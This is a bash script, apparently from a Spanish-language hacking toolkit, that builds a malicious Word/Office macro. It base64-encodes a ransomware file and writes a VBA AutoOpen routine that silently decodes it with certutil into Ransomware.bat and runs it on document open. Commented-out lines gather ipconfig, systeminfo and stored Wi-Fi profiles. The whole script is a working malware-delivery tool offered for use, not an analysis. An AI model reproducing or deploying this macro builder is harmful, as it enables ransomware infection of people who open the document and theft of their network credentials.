bash .banner
as=$(ls -a > .ls)
des=$(grep -o .temp .ls)
if [ "$des" = ".temp" ]; then
bash .banner
echo "Procesando...." | pv -qL 4
a=$(base64 .temp > .asx)
b=$(cat .asx)

echo "Sub chell()" > .m
echo "Shell %cmd /c echo $b > .temp%, vHide" >> .m
echo "Shell %cmdf /c certutil -decode .temp Ransomware.bat | start Ransomware.bat%" >> .m
echo "'Shell %cmd /c ipconfig > trabajo.txt%, vHide" >> .m
echo "'Shell %cmd /c systeminfo >> trabajo.txt%, vHide" >> .m
echo "'Shell %cmd /c netsh wlan show profile >> trabajo.txt%" >> .m
echo "'Shell %cmd /c start Trabajo.exe%, vHide" >> .m
echo "End Sub" >> .m
echo "Sub AutoOpen()" >> .m
echo "chell" >> .m
echo "End Sub" >> .m

alqf=$(sed 's/%/"/g' .m > .mm;mv .mm .m)
backup=$(mkdir $HOME/MgToLs/RANSOMWARE; mkdir $HOME/MgToLs/RANSOMWARE/Windows)
adja=$(cp .m -r $HOME/MgToLs/RANSOMWARE/Windows/Macro.txt)
bash .banner
echo "Macro infectada guardada en MgToLs/RANSOMWARE/Macro.txt"
echo ""
echo "Presiona una tecla para continuar..."
read pause
rm -fr .temp
bash Encry.sh
else

#Else

bash .banner
echo "Para ocultar un Ransomware en una macro primero debes"
echo "de crear un archivo en la opcion 2!"
echo ""
echo "Presiona una tecla para continuar..."
read pause
bash Encry.sh
fi
